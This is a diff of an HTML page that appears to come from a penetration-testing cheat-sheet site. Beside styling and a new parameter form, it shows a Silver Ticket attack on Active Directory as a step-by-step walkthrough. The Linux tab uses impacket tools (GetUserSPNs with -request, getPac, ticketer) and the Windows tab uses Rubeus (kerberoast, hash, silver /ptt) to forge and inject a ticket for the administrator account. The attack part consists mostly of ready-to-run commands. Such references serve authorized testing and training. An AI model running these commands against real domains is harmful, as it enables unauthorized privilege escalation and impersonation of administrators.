@@ -199,8 +199,131 @@
   <li><a href="https://tldrbins.github.io/@getuserspns/">GetUserSPNs</a></li>
   
 </ul>
+<hr>
+<div class="content">
+<div id="params">
+	<form id="params_form" style="display: none;">
+	</form>
+	<div class="center">
+		<button id="form_btn">Show Params Form</button>
+		<button id="replace_btn" style="display: none;">Replace Params</button>
+		<button id="reset_btn" style="display: none;">Reset</button>
+		<button id="clear_btn" style="display: none;">Clear Cache</button>
+	</div>
+</div>
 
-<div class="content"><hr>
+<style>
+#params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: white;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #aaa;
+	font-family: system-ui;
+}
+
+#params * {
+    box-sizing: border-box;
+}
+
+#params input {
+  margin-bottom: 15px;
+}
+
+#params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #f5f5f5;
+}
+
+#params label {
+	color: #333333;
+	font-size: 0.9rem;
+}
+
+#params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #f5f5f5;
+	font-weight: 700;
+	background: rgba(44, 82, 179);
+}
+
+#params button:hover {
+    cursor: pointer;
+    background: rgba(44, 82, 179, 0.95);
+}
+
+.center {
+	display: flex;
+	justify-content: center;
+	align-items: center;
+}
+
+ 
+body.dark-mode #params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: #23272a;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #23272a;
+	font-family: system-ui;
+}
+
+body.dark-mode #params * {
+    box-sizing: border-box;
+}
+
+body.dark-mode #params input {
+	border-radius: 0.2em;
+	border: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input:focus {
+	margin-bottom: 15px;
+	outline: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #bdbdbd;
+}
+
+body.dark-mode #params label {
+	color: #fafafa;
+	font-size: 0.9rem;
+}
+
+body.dark-mode #params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #fafafa;
+	font-weight: 700;
+	background: #616161;
+}
+
+body.dark-mode #params button:hover {
+    cursor: pointer;
+    background: #424242;
+}
+
+
+</style>
 <h3 id="silver-ticket-attack">Silver Ticket Attack</h3>
 <p>
 <button data-tabset="set1" data-tabcontent="tab1" class="active">Linux</button>
@@ -209,66 +332,67 @@
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-get-service-principle-name-spn">1. Get service principle name (SPN)</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ntpdate -s &lt;DC&gt; <span class="o">&amp;&amp;</span> impacket-GetUserSPNs &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt; -dc-ip &lt;DC&gt; -request -k
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># If NTLM auth is disabled</span>
-</span></span><span class="line"><span class="cl">sudo ntpdate -s &lt;DC&gt; <span class="o">&amp;&amp;</span> impacket-GetUserSPNs &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt; -dc-host &lt;DC&gt; -request -k
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-GetUserSPNs &#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;&#39; -dc-ip &lt;DC&gt; -request -k
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> If NTLM auth is disabled
+</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-GetUserSPNs &#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;&#39; -dc-host &lt;DC&gt; -request -k
+</span></span></span></code></pre></div></div>
 <h4 id="2-generate-ntlm">2. Generate NTLM</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">iconv -f ASCII -t UTF-16LE &lt;<span class="o">(</span><span class="nb">printf</span> <span class="s2">&#34;&lt;PASSWORD&gt;&#34;</span><span class="o">)</span> <span class="p">|</span> openssl dgst -md4
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">iconv -f ASCII -t UTF-16LE &lt;(printf &#39;&lt;PASSWORD&gt;&#39;) | openssl dgst -md4
+</span></span></span></code></pre></div></div>
 <h4 id="3-get-domain-sid">3. Get domain SID</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ntpdate -s &lt;DC&gt; <span class="o">&amp;&amp;</span> impacket-getPac -targetUser administrator &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-getPac -targetUser administrator &#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;&#39;
+</span></span></span></code></pre></div></div>
 <h4 id="4-generate-silver-ticket">4. Generate Silver Ticket</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-ticketer -nthash &lt;HASH&gt; -domain-sid &lt;SID&gt; -domain &lt;DOMAIN&gt; -dc-ip &lt;DC&gt; -spn &lt;SPN&gt; administrator
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-ticketer -nthash &lt;HASH&gt; -domain-sid &lt;SID&gt; -domain &lt;DOMAIN&gt; -dc-ip &lt;DC&gt; -spn &lt;SPN&gt; administrator
+</span></span></span></code></pre></div></div>
 <h4 id="5-import-ticket">5. Import ticket</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>administrator.ccache
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">export KRB5CCNAME=administrator.ccache
+</span></span></span></code></pre></div></div>
 <h4 id="6-check">6. Check</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">klist
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">klist
+</span></span></span></code></pre></div></div>
 </div>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><h4 id="1-get-service-principle-name-spn">1. Get service principle name (SPN)</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">rubeus</span><span class="p">.</span><span class="py">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="p">&lt;</span><span class="n">DOMAIN</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">dc</span><span class="err">:</span><span class="p">&lt;</span><span class="n">DC</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">creduser</span><span class="err">:</span><span class="p">&lt;</span><span class="n">DOMAIN</span><span class="p">&gt;\&lt;</span><span class="n">USER</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">credpassword</span><span class="err">:</span><span class="p">&lt;</span><span class="n">PASSWORD</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">nowrap</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe kerberoast /domain:&lt;DOMAIN&gt; /dc:&lt;DC&gt; /creduser:&lt;DOMAIN&gt;\&lt;USER&gt; /credpassword:&#39;&lt;PASSWORD&gt;&#39; /nowrap
+</span></span></span></code></pre></div></div>
 <h4 id="2-generate-ntlm">2. Generate NTLM</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">rubeus</span><span class="p">.</span><span class="py">exe</span> <span class="n">hash</span> <span class="p">/</span><span class="n">password</span><span class="err">:</span><span class="p">&lt;</span><span class="n">PASSWORD</span><span class="p">&gt;</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe hash /password:&#39;&lt;PASSWORD&gt;&#39;
+</span></span></span></code></pre></div></div>
 <h4 id="3-get-domain-sid">3. Get domain SID</h4>
 <h4 id="3a-locally">3a. Locally</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">import-module</span> <span class="n">activedirectory</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-ADDomain</span> <span class="p">|</span> <span class="nb">fl </span><span class="n">DomainSID</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">import-module activedirectory
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Get-ADDomain | fl DomainSID
+</span></span></span></code></pre></div></div>
 <h4 id="3b-remotely">3b. Remotely</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Install ldp.exe (Windows 11)</span>
-</span></span><span class="line"><span class="cl"><span class="n">Settings</span> <span class="p">&gt;</span> <span class="n">System</span> <span class="p">&gt;</span> <span class="n">Optional</span> <span class="n">Features</span> <span class="p">&gt;</span> <span class="n">More</span> <span class="n">Windows</span> <span class="n">Features</span> <span class="n">and</span> <span class="n">add</span> <span class="s1">&#39;Active Driectory Lightweight Directory Services&#39;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Bind &gt; Bind with credentials</span>
-</span></span><span class="line"><span class="cl"><span class="n">ldp</span><span class="p">.</span><span class="py">exe</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Browse &gt; Search</span>
-</span></span><span class="line"><span class="cl"><span class="n">BaseDN</span><span class="err">:</span> <span class="n">DC</span><span class="p">=&lt;</span><span class="n">example</span><span class="p">&gt;,</span><span class="n">DC</span><span class="p">=&lt;</span><span class="n">com</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="k">Filter</span><span class="err">:</span> <span class="p">(</span><span class="n">objectclass</span><span class="p">=</span><span class="n">User</span><span class="p">)</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Install ldp.exe <span class="o">(</span>Windows 11<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="go">Settings &gt; System &gt; Optional Features &gt; More Windows Features and add &#39;Active Driectory Lightweight Directory Services&#39;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Bind &gt; Bind with credentials
+</span></span><span class="line"><span class="cl"><span class="go">ldp.exe
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Browse &gt; Search
+</span></span><span class="line"><span class="cl"><span class="go">BaseDN: DC=&lt;EXAMPLE&gt;,DC=&lt;COM&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">Filter: (objectclass=User)
+</span></span></span></code></pre></div></div>
 <h4 id="4-generate-silver-ticket">4. Generate silver ticket</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">rubeus</span><span class="p">.</span><span class="py">exe</span> <span class="n">silver</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="p">&lt;</span><span class="n">DOMAIN</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">dc</span><span class="err">:</span><span class="p">&lt;</span><span class="n">DC</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">sid</span><span class="err">:</span><span class="p">&lt;</span><span class="n">SID</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">rc4</span><span class="err">:</span><span class="p">&lt;</span><span class="n">HASH</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">administrator</span> <span class="p">/</span><span class="n">service</span><span class="err">:</span><span class="p">&lt;</span><span class="n">SPN</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">nowrap</span> <span class="p">/</span><span class="n">ptt</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe silver /domain:&lt;DOMAIN&gt; /dc:&lt;DC&gt; /sid:&lt;SID&gt; /rc4:&lt;HASH&gt; /user:administrator /service:&lt;SPN&gt; /nowrap /ptt
+</span></span></span></code></pre></div></div>
 <h4 id="5-check">5. Check</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">klist</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">klist
+</span></span></span></code></pre></div></div>
 </div></p>
-<br></div></div>
+<br>
+</div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
